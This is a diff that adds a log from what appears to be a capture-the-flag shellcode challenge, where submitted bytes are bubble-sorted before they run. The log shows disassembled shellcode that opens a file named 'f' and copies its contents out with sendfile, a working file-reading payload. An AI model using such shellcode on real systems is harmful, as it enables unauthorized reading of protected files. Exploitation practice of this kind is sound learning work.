@@ -1,0 +1,27 @@
+Executing filter...
+This challenge is just sorted your your shellcode using bubblesort.
+This sort processed your shellcode 8 bytes at a time. Keep in mind
+The impact of memory endianness on this sort (i.e., the LSB being the
+right-most byte.
+
+This challenge is about to execute the following shellcode:
+
+      Address      |                      Bytes                    |          Instructions
+------------------------------------------------------------------------------------------
+0x0000000001337000 | 90                                            | nop 
+0x0000000001337001 | 66 ba 66 00                                   | mov dx, 0x66
+0x0000000001337005 | 52                                            | push rdx
+0x0000000001337006 | b0 02                                         | mov al, 2
+0x0000000001337008 | 48 89 e7                                      | mov rdi, rsp
+0x000000000133700b | 31 f6                                         | xor esi, esi
+0x000000000133700d | 0f 05                                         | syscall 
+0x000000000133700f | 50                                            | push rax
+0x0000000001337010 | 41 b2 3c                                      | mov r10b, 0x3c
+0x0000000001337013 | 31 d2                                         | xor edx, edx
+0x0000000001337015 | 5e                                            | pop rsi
+0x0000000001337016 | 48 89 f7                                      | mov rdi, rsi
+0x0000000001337019 | ff cf                                         | dec edi
+0x000000000133701b | b0 28                                         | mov al, 0x28
+0x000000000133701d | 0f 05                                         | syscall 
+
+Executing shellcode!
